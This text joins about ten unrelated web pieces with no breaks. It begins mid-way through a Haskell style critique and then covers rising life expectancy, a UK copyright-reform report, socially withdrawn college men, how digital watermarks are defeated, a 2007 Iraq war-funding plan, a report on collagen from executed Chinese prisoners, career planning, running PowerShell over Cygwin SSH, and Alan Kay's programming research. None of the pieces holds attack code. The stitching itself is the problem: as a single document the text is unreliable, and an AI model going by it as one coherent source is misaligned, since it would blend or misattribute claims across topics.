However , consider " main = getArgs >>= putStrLn . (!! 0 ) " .
When point free style is used in the middle of a larger expression , perhaps with a curry ( or in this case a section ) , a " > >= " , and function composition , things can get out of control .
I think it 's often clearer to use an explicit argument so that the reader does n't have to figure out where the invisible argument is being consumed .
Even though the following is one line longer , it 's much easier to read : Point free style is even more inscrutible if no type declaration is given .
In such cases , the reader is forced to hunt down the right number and type of arguments .
The $ operator " $ " is function application .
Consider " putStrLn $ args !! 0 " .
This is the same as " putStrLn ( args !! 0 ) " , but you do n't need the parenthesis .
Aside from the fact that you 're left wondering which has higher precedence , " $ " or " !! " , this is an improvement .
However , if you have a very long line with a mix of " . " and " $ " , things can get confusing .
Worse , you end up reading the code from right to left .
It seems strange to have to look at the operators in order to figure out whether to read from left to right or right to left .
Sometimes , you 're left reading from the inside outward .
It 's trivial to write a function application operator that has its arguments in reverse , and I think it improves readability .
After all , that 's exactly how UNIX pipes work , for instance , " cat a | b | c " .
Furthermore , that 's how " > >= " works for monads .
My earlier comment about excessive use of point free style still stands , though .
If you get too many " invisible " variables , it may be better to use a " let " or a " where " .
Record member accessI think C's " a.b " is clearer than " b a " , especially when you have multiple levels .
Consider , " a.b.c " vs. " ( c . b ) a " .
Mixing monadsFor new programmers , OOP can be mildly difficult to understand , but it 's powerful .
Monads are even harder to understand , and they 're even more powerful .
If you consider " obj.getHouse ( ) .getDoor ( ).ringDoorbell ( ) " , playing with multiple objects at the same time seems to have linear mental complexity .
However , playing with multiple monads at the same time seems to have exponential mental complexity , especially since you can only use the " do " syntax with one monad at a time .
If you mix the State monad ( for state ) with an Either ( for error handling ) , a Maybe ( for NULL encapsulation ) , IO , etc. , things get tricky .
Hand waving a bit , if it were trivial to mix and match monads , there would n't be a need to put IORef in the library -- the user could just mix IO and State on the fly .
Conclusion
In general , I really like Haskell , so please have * some * mercy on me when you flame me to death for stating these opinions ;)
One way to extend human lifespan is … to wait .
Average life expectancies in industrialized countries are slowly increasing over time — though this increase is slower than the march of time itself .
If the increase in average lifespan were as fast ( or faster ) as the increase in calendar time , we could be said to have achieved “ actuarial escape velocity , ” a concept I learned from this entry at the Institute for Ethics and Emerging Technologies weblog :
US life expectancy at 65 up 1 year from 1999 to 2004 …
Meaning the U.S. is at 20 % of escape velocity .
However longevity gains were not shared equally by gender or ethnicity ( or social class , but that ’s not a term Americans know ) .
During 1999 - 2004 , life expectancy at age 65 years increased by 1.0 year for the overall U.S. population , 1.1 years for white men , 0.8 years for white women , 0.9 years for black men , and 1.3 years for black women .
Leaving aside for the moment the snotty ( but , I ’m sure , good - natured ) implication that Americans do n’t understand social class , I think this is a valuable idea .
If the rate of increase in average life expectancy was 1 year per annum ( five times larger than the current rate of 0.2 years per annum ) , we ’d find ourselves no closer to death ( on average ) as time went by — a situation with massive demographic implications , obviously , but also a significant inflection point in the story of our relationship with aging and a useful benchmark for practical considerations of anti-aging research .

It is not the music industry 's job to decide consumer rights , says IPPR
The Institute for Public Policy Research ( IPPR ) is calling for a " private right to copy " .
It would decriminalise millions of Britons who break the law each year by copying their CDs onto music players .
Making copies of CDs and DVDs for personal use would have little impact on copyright holders , the IPPR argues .
Copyright issues have , in the past , been steered too much by the music industry , the report said .
Public respect
IPPR deputy director Dr Ian Kearns said : " When it comes to protecting the interests of copyright holders , the emphasis the music industry has put on tackling illegal distribution and not prosecuting for personal copying , is right .
" But it is not the music industry 's job to decide what rights consumers have that is the job of government . "
POLICY PROBLEMS
When the economic , the political , the cultural and the moral are closely connected in a policy problem , policy frameworks need to be built to recognise this .

Report author Kay Withers said : " The idea of all - rights reserved does n't make sense for the digital era and it does n't make sense to have a law that everyone breaks .
To give the IP regime legitimacy it must command public respect . "
Intellectual property laws are currently being reviewed by the government .
Chancellor Gordon Brown has asked chairman Sir Andrew Gowers to report his findings back ahead of the pre-budget report in November .
The IPPR is hoping to influence this with its report , entitled Public Innovation : Intellectual property in a digital age .
Its key recommendation is that any policy regarding Intellectual Property policy should recognise that knowledge is a public resource first and a private asset second .
Social glue
The so - called knowledge economy is growing fast as the traditional manufacturing of goods is replaced by more intangible assets .
With it is a growing paradox in which intellectual property is both a commercial and cultural resource .
Knowledge must , therefore , perform the roles of both commodity and social glue , both private property and public domain
IPPR report
" The internet offers unprecedented opportunities to share ideas and content , " the report says .
" Knowledge must , therefore , perform the roles of both commodity and social glue , both private property and public domain , " it adds .
The report looks at how Digital Rights Management ( DRM ) technologies - which restrict the sharing of music or other intellectual property - are affecting attempts to preserve electronic content .
It argues that the British Library should be given a DRM - free copy of any new digital work and that libraries should be able to take more than one copy of digital work .
Ms Withers said : " We charge the British Library as being the collective memory of the nation and increasingly it has to archive digital content .
" More and more academic journals are delivered digitally but copyright laws are n't designed to deal with digital content . "
She said there was often a conflict between DRM and accessibility technologies which needs to be addressed .
" Someone with poor sight may use a screen reader technology and may have to change the format of the content to use it but some DRM technology is n't sophisticated enought to take this kind of thing into account , " she said .
The report also calls for the government to reject calls from the UK music industry to extend the copyright term for sound recording beyond the current 50 years .
At Dickinson , some professors and administrators have begun to notice a similar withdrawal among men who arrive on campus with deficient social skills .
Each year , there are several who mostly stay in their rooms , talk to no one , play video games into the wee hours and miss classes until they withdraw or flunk out .
This spring , Rebecca Hammell , dean of freshman and sophomores , counseled one such young man to withdraw .
" He was in academic trouble from the start , " Ms. Hammell said .
" He was playing games till 3 , 4 , 5 in the morning , in an almost compulsive way .
From early in the year , his teachers reported that he was either not coming to class or falling asleep once he was there .
I checked with the Residential Life office , and they said he was in his room all the time . "
Of course , female behavior has its own extremes .
In freshman women , educators worry about eating disorders and perfectionism .
But among the freshman men , the problems stem mostly from immaturity .
" There was so much freedom when I got here , compared to my very structured high school life , that I kept putting things off , " said Greg Williams , who just finished his freshman year .
" I would n't do much work and I played a lot of Halo .
I did n't know how to wake up on time without a mom .
I had laundry problems .
I shrank all my clothes and had to buy new ones . "
Still , men in the work force have always done better in pay and promotions , in part because they tend to work longer hours , and have fewer career interruptions than women , who bear the children and most of the responsibility for raising them .
Whether the male advantage will persist even as women 's academic achievement soars is an open question .
But many young men believe that , once in the work world , they will prevail .
" I think men do better out in the world because they care more about the power , the status , the C.E.O. job , " Mr. Kohn said .
" And maybe society holds men a little higher . "

I wrote Wednesday about Randy Picker ’s suggestion of using digital watermarks to embed users ’ personal financial information into media files , to discourage users from sharing the files .
Today , I want to talk more generally about watermarks and how they tend to fail .
First , some background .
Watermarks are subtle signals embedded in the background of media files .
They are supposed to be unobtrusive but easy to detect if you know where to look .
Different media have different kinds of watermarks .
In a photo , the watermark might be hidden in subtle patterns of shading .
In music , it might be in a very soft background buzz , or a barely audible echo .
In many applications , a watermark must resist attempts by an adversary to remove it .
For example , in Randy ’s scheme , a user might want to remove the identifying watermark from a media file because he wants to share the file illegally , or because he does n’t want his personal information exposed to cyber - intruders .
It is often important to know how resistant a particular watermark is to removal .
There has been plenty of research on this topic , from which we can draw lessons about how watermark removal tends to work .
One theme is the power of Rosetta Stone attacks .
The original Rosetta Stone was a stone tablet with the same text written in three ancient languages .
This gave scholars who understood one of the languages a big boost in deciphering another one that they did n’t understand .
Similarly , watermarks tend to be defeated if an adversary can get his hands on a watermarked file , and the same file without the watermark .
By comparing the two , the adversary can determine where the watermark lives , which is usually sufficient to remove the watermark from other files .
Alex used this method in deciphering the MediaMax watermark ( as described in our Sony CD DRM paper ) , and my colleagues and I used it also in analyzing the SDMI watermarks back in 2000 .
Almost as powerful as a Rosetta Stone attack is a comparison attack , where the adversary does not have an unwatermarked file , but does have the same file with several different watermarks in it .
Any place where two of the files differ is a place where watermark information lives .
Given several marked files , an attacker can locate all or most of the places the watermark is hidden , which is again the first step in removing the watermark .
( In theory it might be possible to stop an adversary with access to a limited number of individually watermarked files from completely removing the watermark , if the watermark has lots of places to hide and is constructed cleverly .
There is an interesting body of theory about how to do this and when it works .
But in practice the assumptions underlying that theory rarely hold . )
Even if the adversary cannot get access to multiple versions of a file ( so that Roseta Stone or comparison attacks are not possible ) , he can usually still defeat a watermark if he has access to a device that can detect watermarks .
By reverse engineering the device , he can figure out where it is looking for the watermark , which again puts him in a position to remove it .
( Even if he ca n’t dissect the device , he can use it as an oracle that tells him whether a particular file has a detectable watermark .
Oracles are very helpful in attacking watermarks – Alex used one in his MediaMax watermark analysis , and my colleagues and I used one in our SDMI analysis . )
All of this helps us to understand where watermarks are likely to be effective and where they ’re not .
The best case for watermarking is where each file is published in a single version , with a watermark in a location that is not disclosed to the public and is not implemented in a device available to the public .
This would hold true , for example , in a system that put a distinctive mark into all released versions of a file , and then looked for such watermarks in content broadcast on the radio or TV or downloaded from the net .
Not nearly as strong is a system where there is a single watermark per file , and consumer devices check for the mark – it is subject to reverse engineering and oracle attacks .
Weaker yet is a system where files are watermarked individually for each consumer – it is subject to comparison attacks .
Weakest of all is a system where files are watermarked individually for each consumer and everyone is told how to read the watermarks .
Here the adversary can use comparison attacks , and reverse engineering is not even necessary because the inner working of the watermark detector are well known .
Alert readers will have noticed that all of the uses of watermarks for DRM ( copy protection ) seem to fall into the weak categories .
That is because DRM applications require either that all devices check for the watermark – opening up reverse engineering and oracle attacks – or alternatively that a file be given separate watermarks for separate consumers – opening up comparison attacks .
Watermarking has its uses , but it does n’t seem well suited for DRM .
As a timetable , it could hardly be clearer : Show progress in Iraq by July or begin withdrawing US troops .
Meet your goals by October or start bringing the troops home .
No matter what , all troops are out by August 2008 .
By drawing their line in the sand , House Democratic leaders are trying to ratchet up pressure on the White House to change its Iraq strategy while trying to persuade Americans that there is another way forward on the war on terror .
That direction , they say , involves intensifying the fight in Afghanistan while winding down involvement in Iraq .
As a practical matter , the legislation stands slim chance of passage as written .
Antiwar House Democrats have n't yet signed on , and House Republican leaders condemned it .
But as a gauge of America 's war weariness , it may serve as a sounding board for a citizenry eager for solutions to a conflict that has proved frustratingly complex .
" We have to ... take the conversation to the American people and , hopefully , [ President Bush ] will hear them , " House Speaker Nancy Pelosi said in announcing the plan Thursday on Capitol Hill .
After weeks of intense discussion within a deeply divided caucus , House Democratic leaders released their multifaceted funding plan .
It adds $ 4 billion to Mr. Bush 's $ 95.5 billion request for the Defense Department , including significant increases for military readiness and healthcare and housing for returning troops .
It also requires the president to certify that " benchmarks of accountability " for the Iraqi government are met and that US forces are not sent into combat without meeting the military 's own basic guidelines for unit readiness , including a year at home before redeployment to Iraq .
The plan sets two key dates for the president to certify " meaningful and substantial progress " in meeting political and military benchmarks : July 1 and Oct. 1 , 2007 .
If the president cannot meet that requirement , the plan calls for the immediate redeployment of US forces out of Iraq , to be completed within 180 days .
" Unless there is progress made in meeting benchmarks by July 2007 , we begin the redeployment of our troops out of a combat role in Iraq , " said Speaker Pelosi .
If they are met , the Secretary of Defense must begin redeploying US forces out of Iraq by March 1 , 2008 , and complete the redeployment within 180 days , she added .
The deal aims to strike a balance between two often competing wings of the House Democratic caucus : conservatives , who oppose any move to " micromanage " the war , and the liberal " Out of Iraq " caucus , which wants to see the newly empowered Democrats use war funding to leverage an end to the war now .
The 44 - member Blue Dog Coalition , which opposes any move that threatens to deprive US troops of funding , and other center - right Democrats have been urging leaders to give the president a waiver in any plan that tried to impose conditions on the spending of war funds .
Pelosi confirmed that such waivers would be part of the plan but did not specify how they would affect the timetable for withdrawal .
Even before full details of the Democratic proposal were released , leaders of the more liberal 71 - member Progressive Congressional Caucus urged caution in supporting it .
" There are many people talking about voting against this bill , " said Rep. Lynn Woolsey ( D ) of California , who chairs the caucus .
She and others at a press briefing on Thursday say they are calling for a vote on an amendment by Rep. Barbara Lee ( D ) of California that requires completion of the withdrawal not later than Dec. 31 , 2007 .
" The American people expect Democrats to end this war now , " said another caucus member , Rep. Dennis Kucinich ( D ) of Ohio .
House Republican leader John Boehner attacked the measure .
He said the legislation amounted to " establishing and telegraphing to our enemy a timetable " that would result in failure of the US mission in Iraq .
To pass the House , the legislation needs 218 votes .
" We are a caucus , and we will come together and find our common ground , " Pelosi said .
She also said that she did n't know what purpose it would serve to allow a vote on the Lee amendment .
At press time , most lawmakers were still learning details of the agreement and not ready to commit either way on a vote .
To boost prospects for a positive vote , Democrats have packed the bill – officially , the US Troop Readiness , Veterans ' Health and Iraq Accountability
Act – with new funding for issues ranging from hurricane recovery on the Gulf Coast to veterans ' health .
These include $ 1.7 billion to enhance medical services for active duty forces and mobilized reserves , and their family members – an especially high - profile issue in Washington after recent press reports of poor treatment at the Walter Reed Army Medical Center in Washington , D.C. [ Editor 's note :
The original version incorrectly named and located Walter Reed Army Medical Center . ]
Democrats also propose adding $ 1.4 billion to cover the full cost of housing allowances for military members in this fiscal year , $ 2.5 billion to address training and equipment shortfalls in forces not deployed to theaters of operation , $ 1.4 billion to purchase highly touted mine - resistant vehicles – an increase of $ 311 million above the president 's request .
The plan also recommends reductions to several high - profile programs requested by the president , including denial of funding for two Joint Strike Fighter purchases and five of the six EA - 18G electronic attack airplanes requested by the Navy .

A Chinese cosmetics company is using skin harvested from the corpses of executed convicts to develop beauty products for sale in Europe , an investigation by the Guardian has discovered .
Agents for the firm have told would - be customers it is developing collagen for lip and wrinkle treatments from skin taken from prisoners after they have been shot .
The agents say some of the company 's products have been exported to the UK , and that the use of skin from condemned convicts is " traditional " and nothing to " make such a big fuss about " .
With European regulations to control cosmetic treatments such as collagen not expected for several years , doctors and politicians say the discovery highlights the dangers faced by the increasing number of Britons seeking to improve their looks .
Apart from the ethical concerns , there is also the potential risk of infection .
MPs on the Commons select health committee are to examine the regulatory system and may launch an investigation and question ministers about the need for immediate new controls .
" I am sure that the committee will want to look at this , " said Kevin Barron , its Labour chairman .
" This is something everyone in society will be very concerned about . "
Plastic surgeons are also concerned about the delay in introducing regulations to control the cosmetic treatments industry .
Norman Waterhouse , a former president of the British Association of Aesthetic Plastic Surgeons , said : " I am surprised that we are taking the lead from the European commission , because this is bound to delay action on this important area which is increasingly a matter for concern .
It seems like a bit of a cop out to me . "
It is unclear whether any of the " aesthetic fillers " such as collagen available in the UK or on the internet are supplied by the company , which can not be identified for legal reasons .
It is also unclear whether collagen made from prisoners ' skin is in the research stage or is in production .
However , the Guardian has learned that the company has exported collagen products to the UK in the past .
An agent told customers it had also exported to the US and European countries , and that it was trying to develop fillers using tissue from aborted foetuses .
Traditional
When formally approached by the Guardian , the agent denied the company was using skin harvested from executed prisoners .
However , he had already admitted it was doing precisely this during a number of conversations with a researcher posing as a Hong Kong businessman .
The Press Complaints Commission 's code of practice permits subterfuge if there is no other means of investigating a matter of public interest .
The agent told the researcher : " A lot of the research is still carried out in the traditional manner using skin from the executed prisoner and aborted foetus . "
This material , he said , was being bought from " bio tech " companies based in the northern province of Heilongjiang , and was being developed elsewhere in China .
He suggested that the use of skin and other tissues harvested from executed prisoners was not uncommon .
" In China it is considered very normal and I was very shocked that western countries can make such a big fuss about this , " he said .
Speaking from his office in northern China , he added : " The government has put some pressure on all the medical facilities to keep this type of work in low profile . "
The agent said his company exported to the west via Hong Kong .
" We are still in the early days of selling these products , and clients from abroad are quite surprised that China can manufacture the same human collagen for less than 5 % of what it costs in the west . "
Skin from prisoners used to be even less expensive , he said .
" Nowadays there is a certain fee that has to be paid to the court . "
The agent 's admission comes after an inquiry into the cosmetic surgery industry in Britain , commissioned by the Department of Health , pointed to the need for new regulations controlling collagen treatments .
Sir Liam Donaldson , the chief medical officer , has highlighted the inquiry 's concerns about the use of cadavers for cosmetic treatments .
" Cosmetic procedures are a rapidly growing area of private health care , " he said .
" We must ensure we properly protect patients ' safety by improving the training and regulation . "
The DoH has agreed to the inquiry 's recommendations , but is waiting for the European commission to draw up proposals for laws governing cosmetic products .
It could be several years before this legislation takes force .
Meanwhile , cosmetic treatments , including those with with aesthetic fillers , are growing rapidly in popularity , with around 150,000 injections or implants administered each year in the UK .
Lip enhancement treatments are one of the most popular , costing an average of £ 170 .
Some fillers are made from cattle or pig tissue , and others from humans .
The DoH believes that there may be a risk of transmission of blood - borne viruses and even vCJD from collagen containing human tissue .
Although there is as yet no evidence that this has happened , the inquiry found that some collagen injections had triggered inflammatory reactions causing permanent discomfort , scarring and disfigurement .
In their report , the inquiry team said that if there was a risk , " action should be taken to protect patient safety through regulation " .
While new regulations are to be drawn up , the department is currently powerless to regulate most human - tissue fillers intended for injection or implant , as they occupy a legal grey area .
Most products are not governed by regulations controlling medical products , as they are not classified as medicines .
They also escape cosmetics regulations , which only apply to substances used on the surface of the skin and not those injected beneath it .
The Healthcare Commission is planning new regulations for cosmetic surgery clinics next year , but these will not control the substances used by plastic surgeons .
Hand transplants
A number of plastic surgeons have told the Guardian that they have been hearing rumours about the use of tissue harvested from executed prisoners for several years .
Peter Butler , a consultant plastic surgeon and government adviser , said there had been rumours that Chinese surgeons had performed hand transplants using hands from executed prisoners .
One transplant centre was believed to be adjacent to an execution ground .
" I can see the utility of it , as they have access and no ethical objection , " he said .
" The main concern would be infective risk . "
Andrew Lee of the University of Pittsburgh School of Medicine , who has visited China to examine transplant techniques , said he had heard similar rumours .
Manufacturers of aesthetic fillers said they had seen Chinese collagen products on sale at trade fairs , but had not seen any labelled Chinese - made in the UK .
Dan Cohen , whose US - based company , Inamed , produces collagen products , said : " We have come across Chinese products in the market place .
But most products from China are being sold ' off - label ' or are being imported illegally . "
In China , authorities deny that prisoners ' body parts are harvested without their consent .
However , there is some evidence to suggest it may be happening .
In June 2001 , Wang Guoqi , a Chinese former military physician , told US congressmen he had worked at execution grounds helping surgeons to harvest the organs of more than 100 executed prisoners , without prior consent .
The surgeons used converted vans parked near the execution grounds to begin dissecting the bodies , he told the house international relations committee 's human rights panel .
Skin was said to be highly valued for the treatment of burn victims , and Dr Wang said that in 1995 he skinned a shot convict 's body while the man 's heart was still beating .
Dr Wang , who was seeking asylum in the US , also alleged that corneas and other body tissue were removed for transplant , and said his hospital , the Tianjin paramilitary police general brigade hospital , sold body parts for profit .
Human rights activists in China have repeatedly claimed that organs have been harvested from the corpses of executed prisoners and sold to surgeons offering transplants to fee - paying foreigners .
Dr Wang 's allegations infuriated the Chinese authorities , and in a rare move officials publicly denounced him as a liar .
The government said organs were transplanted from executed prisoners only if they and their family gave consent .
Although the exact number of people facing the death penalty in China is an official secret , Amnesty International believes around 3,400 were executed last year , with a further 6,000 on death row .
What is it ?
Collagen is a major structural protein found in abundance in skin , bones , tendons and other connective tissue .
Matted sheets of collagen give skin its toughness and by winding into molecular " cables " , it adds strength to tendons .
What is it used for ?
Collagen injections are used in cosmetic surgery to plump up lips and flatten out wrinkles .
After botox , collagen injections are the second - most popular cosmetic operations in Britain .
Collagen does not have a permanent effect and several injections are often needed .
What else is it good for ?
Collagen was being put to good use as far back as the stone age .
Neolithic cave dwellers around the Dead Sea are believed to have used it as a primitive form of glue some 8,000 years ago .
More recently , researchers have developed a form that can be poured or injected into wounds to seal them .
Where does it come from ?
A number of sources .
Some companies extract it from cow skin and treat it to minimise the risk of allergic reactions or infection .
Others collect it from human donors or extract cells from the patient before growing the necessary amount in a laboratory .
Is it safe ?
Collagen can cause allergic reactions if it has not been treated correctly , and there is a theoretical risk of disease being passed on .
A small amount of collagen is often injected into the skin a few weeks before treatment to test for possible allergic reactions .
Earlier this year , Sir Liam Donaldson warned that collagen injections could spread conditions such as hepatitis and variant CJD , the human form of mad cow disease .
Why Career Planning Is Time Wasted
Our culture worships planning .
Everything must be planned in advance .
Our days , week , years , our entire lives .
We have diaries , schedules , checklists , targets , goals , aims , strategies , visions even .
Career planning is the most insidious of these cults precisely because it encourages a feeling of control over your reactions to future events .
As that interview question goes : where do you see yourself in five years time ?
This invites the beginning of what starts as a little game and finishes as a belief built on sand .
You guess what employers want to hear , and then you give it to them .
Sometimes this batting back and forth of imagined futures becomes a necessary little game you play in order to ‘ get ahead ’ .
“ We want to make a decision all of our own , based on our own values and preferences . ”
In reality , people frequently do n’t know what they want and psychology has proved it .
That ’s why career planning , or at the very least just deciding what you ’re going to do next , is so unpleasant .
It ’s no fun at 18 years old when people ask what you want to do .
There seem to be so many different options , each with myriad branching possibilities , many of which lead in opposite directions , but all equally tempting .
Surrounded by these endless spiralling futures , it is no wonder that many a school - leaver sticks with what they know and follows in parental footsteps .
But we do n’t all want to trust the tried and tested , whether for good reasons or bad .
We want to make a decision all of our own , based on our own values and preferences .
Midlife crisis
If it ’s hard at 18 , it ’s even harder in midlife when people are theoretically better equipped to make their choice .
In reality by your 30s wide - eyed optimism has normally been replaced by a more cynical outlook on jobs and the workplace .
Now it ’s more clear what the downsides of certain jobs are .
There ’s not only our own experiences of work but we also have friends at work , all of whom colour our perception of their careers .
Everyone has their own internal trade - offs .
How much routine do you like : boring but safe ?
How much do you like travel : exciting but you ’ll be away from loved ones ?
How much do you care about earning more money : and taking a more boring / stressful / less fulfilling job ?
Whatever the outcome of all these swings and roundabouts along with many more , the reason that deciding what to do with your life is so difficult is that it involves predicting the future .
There ’s many reasons why it seems we should be good at prediction what we want .
If I know that I ’m enjoying what I ’m doing now , then I should enjoy it in the future should n’t I ?
On top of this I ’ve got years of experience building up a set of things I like – cinema , books , sitcoms – and things I do n’t like – trips to the dentist , severe embarrassment and flu , especially not all at the same time .
If I ’ve got this huge bank of likes and dislikes it should be easy to predict my wants in the future .
And yet , it seems we are often surprised by what the future throws at us .
Miswanting
“ We are poor at predicting what will make us happy in the future . ”
The idea of making mistakes about what we might want in the future has been termed ‘ miswanting ’ by Gilbert and Wilson ( 2000 ) .
They point to a range of studies finding we are poor at predicting what will make us happy in the future .
My favourite is a simple experiment in which two groups of participants get free sandwiches if they participate in the experiment – a doozie for any undergraduate .
One group has to choose which sandwiches they want for an entire week in advance .
The other group gets to choose which they want each day .
A fascinating thing happens .
People who choose their favourite sandwich each day at lunchtime also often choose the same sandwich .
This group turns out to be reasonably happy with its choice .
Amazingly , though , people choosing in advance assume that what they ’ll want for lunch next week is a variety .
And so they choose a turkey sandwich Monday , tuna on Tuesday , egg on Wednesday and so on .
It turn out that when next week rolls around they generally do n’t like the variety they thought they would .
In fact they are significantly less happy with their choices than the group who chose their sandwiches on the day .
Prediction failure
This variety versus sameness is only one particular bias that people display in making predictions about their future emotional states .
There is another counter - intuitive bias emerging from the work being done in positive psychology .
This looks at how people predict they will feel after both catastrophically bad , and , conversely , fantastically positive occurrences in their life .
For example , how good would you feel if you won the lottery ?
Most people predict their lives will be completely changed and they ’ll be much happier .
What does the research find ?
Yes , people are measurably happier after they ’ve just won , but six months down the line they ’re back to their individual ‘ baseline ’ level of happiness .
So , in the journey from the sublime – predicting how we ’ll feel about winning the lottery – to the ridiculous – predicting which sandwiches we ’ll want for lunch – we are incredibly bad at knowing our future selves .
And if we ca n’t even decide what type of sandwich we might like next week , how can we possibly decide what type of job we ’d like to be doing in twenty years ?
With age occasionally comes wisdom .
Over time we learn , whether implicitly or explicitly , that we are not that good at predicting the future .
At the very least we begin to recognise it is a much less precise science than we once thought .
A stranger future
This means your future self is probably a stranger to you .
And , on some level , you know it .
That ’s why it might be hard for an 18 year old to choose their career , but it ’s a damn sight harder for someone in midlife when limitations have been learnt .
“ People begin to understand that the future holds vanishingly few certainties … ”
This might seem like just another way of saying that people get more cautious as they get older , but it is more than that .
It ’s actually saying that it ’s not caution that ’s increasing with age , but implicit self - knowledge .
People begin to understand that the future holds vanishingly few certainties , even for those things that would seem to be under our most direct control , like our sandwich preferences .
Best guess beats careful planning
The argument about miswanting applies to any area of our lives which involves making a prediction about what we might like in the future .
Career planning becomes painful precisely because it ’s such an important decision and we come to understand that we have only very limited useful information .
The best strategy for career planning is this : make your best guess , try it out and do n’t be surprised if you do n’t like it .
But for heaven ’s sake do n’t mention this in your interviews .
[ Also see the aptly named ‘ chaos theory ’ of career planning that I ’ve noted before . ]

Introduction
Windows PowerShell is a new command - line shell and task - based scripting technology that provides comprehensive control and automation of system administration tasks .
Windows PowerShell allows Windows administrators to be more productive by providing numerous system administration utilities , consistent syntax , and improved navigation of common management data such as the registry or Windows Management Instrumentation ( WMI ) .
Windows PowerShell also includes a scripting language which enables comprehensive automation of Windows system administration tasks .
The Windows PowerShell language is intuitive and supports existing scripting investments .
Exchange Server 2007 and System Center Operations Manager 2007 will be built on Windows PowerShell . -- Windows Server 2003 Technologies - PowerShell
I come from UNIX , where the text shell is the preferred way to do system administration .
I ’ve been following Powershell n e Monad for some time .
Windows has needed a powerful shell since before MS - DOS ( not sure what the default shell in Xenix was ) .
The PowerShell team seems to be laying out some of the architecture that will be needed to bring Microsoft forward on this front .
I ’ve argued before that one of the reasons Google is beating Microsoft is the easy scriptability and command line interface on Google ’s Platform , Linux .
If Microsoft wants to play seriously with admins like me and compete with Apple and Google , they will have to continue building on PowerShell .
One of the key components of System Administration is remote access .
It would be absurd to have to physically walk up to every machine you were responsible for and use the keyboard and mouse to configure or install anything .
There are some pretty good tools for working with Windows remotely , but most of them require a video card and mouse .
I can type upwards to 100 words a minute , anytime I have to move my hands off the home row to the mouse , I am losing productivity .
Anytime I have to stream video , I am wasting bandwidth .
I can administer a UNIX box from a palmtop device like a Sidekick over a slow cell phone connection .
One of the first things that an admin wants to do with PowerShell is run remotely .
To do this securely , you must encrypt your data .
SSH has been the proven way to do this .
So the question becomes , how do I connect SSH and PowerShell together ?
With a little bit of kludge , it is possible .
Why this was n’t included by default in version 1.0 , I have no idea .
My advice and plea to the Microsoft developers is to just use SSH .
Please do n’t invent a proprietary Microsoft only tool to do this .
Please please please please !
Note :
The following assumes that you have logged in as a local admin and this account has a password .
Download and Install Cygwin
Fire up Firefox ( or your favorite browser ) and choose a Cygwin Mirror .
Select a mirror
Download setup.exe
Run setup.exe
Most of the defaults can be left as is
However , make sure to select SSH under the Network category .
It will select the other required dependencies for you .
Configure Cygwin
Right click My Computer , select Properties -> Advanced -> Environment Variables .
Next , click the New button and add :
name : CYGWIN value : ntsec
Select the Path variable and click Edit then append ; c:\cygwin\bin ( assuming you installed Cygwin here ) at the end of the existing string .
Note :
The following requires Microsoft Passport aka Live ID
Unzip the downloads and run their respective setup .
I used all the defaults .
Run Cygwin
Either click the green Cygwin icon or run c:\cygwin\cygwin.bat
Run ssh install script : $ ssh- host - config
Answer “ yes ” to every question except for the last one , which should be ntsec
Should privilege separation be used ?
( yes / no ) yes Should this script create a local user ‘ sshd ’ on this machine ?
( yes / no ) yes Do you want to install sshd as service ?
( Say “ no ” if it ’s already installed as service ) ( yes / no ) yes Which value should the environment variable CYGWIN have when sshd starts ?
It ’s recommended to set at least “ ntsec ” to be able to change user context without password .
Default is “ ntsec ” .
CYGWIN=ntsec Start SSHD $ net start sshd The CYGWIN sshd service is starting .
The CYGWIN sshd service was started successfully .
Run Powershell
Start -> Programs -> Windows Powershell .
Choose to always accept Microsoft signed code .
Close PowerShell
Test SSH and Powershell
Run Putty or your favorite ssh client and connect to localhost .
Accept the hash and login .
If everything works , you should be at a bash prompt in Cygwin .
Next run PowerShell .
Due to the limitations of PowerShell v1.0 we have to tell it that we are redirecting the input .
Note that you wo n’t get any output from PowerShell indicating that it started up , including a command prompt !
$ /cygdrive/c/Program Files / Windows PowerShell/v1.0/powershell.exe
- Command
Try a PowerShell one - liner :
[ System.Net.Dns ]::GetHostbyAddress( “ 207.46.198.30 ” )
[ System.Net.Dns ]::GetHostAddresses(“ www.msn.com”)
dir | where {$_ .
PsIsContainer}

February 12 , 2007 — jao
Alan Kay hardly needs a presentation , so i wo n’t waste your time before pointing out to his latest interview , where he talks with Allan E . Alter about the current computing landscape .
As you may expect from a visionary such as Kay , he is not exactly happy with what he sees , and is currently working in his Viewpoints Research Institute to try and invent the future of programming .
Besides his involvement in the “ One Laptop per Child ” project , Kay and coworkers have recently been awarded a NFS grant to develop their ideas on how a better programming platform should be .
If you ’re curious ( and who would not ! ) , you can read some of the details of their amazing plans in the proposal they submitted to the NFS : Steps Towards the Reinvention of Programming .
This proposal for the future starts by trying to recover the best from the past , particularly the seemingly forgotten ideas of another visionary , Doug Engelbart .
As Kay rightly points out during the interview ,
[ Most of those ideas ] were written down 40 years ago by Engelbart .
But in the last few years I ’ve been asking computer scientists and programmers whether they ’ve ever typed E - N - G - E - L - B - A - R - T into Google - and none of them have .
I do n’t think you could find a physicist who has not gone back and tried to find out what Newton actually did .
It ’s unimaginable .
Yet the computing profession acts as if there is n’t anything to learn from the past , so most people have n’t gone back and referenced what Engelbart thought .
The reinventing programming project tries to change this situation with some interesting proposals .
Their envisioned system would put forward the lessons drawn from Squeak and Etoys towards the creation of a fully introspective environment which can be understood completely by its users ; actually , a system which guides programmers to full disclosure of its innards .
In Kay and coworkers ’ words :
This anticipates one of the 21st century destinies for personal computing : a real computer literacy that is analogous to the reading and writing fluencies of print literacy , where all users will be able to understand and make ideas from dynamic computer representations .
This will require a new approach to programming . [… ]
This will eventually require this system to go beyond being reflective to being introspective via a self - ontology .
This can be done gradually without interfering with the rest of the implementation .
So , simplicity is key , and they purport to write such a system in a mere 20 K LOC .
To that end , they propose a sort of great unification theory of particles ( homogeneous , extensible objects ) and fields ( the messages exchanged by myriad objects ) — well , yes , it ’s just a metaphor , but you can see it in action in the paper , applied to images and animations .
The report also explains how the physical metaphor is completed with a proper simulation of the concept of time .
As for introspection , inspiration comes , quite naturally , from Lisp :
What was wonderful about this [ John McCarthy ’s ] approach is that it was incredibly powerful and wide - ranging , yet was tiny , and only had one or two points of failure which would cause all of it to “ fail fast ” if the reasoning was faulty .
Or , if the reasoning was OK , then the result would be a very quick whole system of great expressive power .
( John ’s reasoning was OK . )
In the early 70s two of us used this approach to get the first version of Smalltalk going in just a few weeks : one of us did what John did , but with objects , and the other did what Steve Russell did .
The result was a new powerful wide - ranging programming language and system seemingly by magic .
Lest anyone thinks that all of this is just a loosely knitted bag of metaphors and wishful thinking , the report gives some technical detail on an actual implementation of some of these ideas .
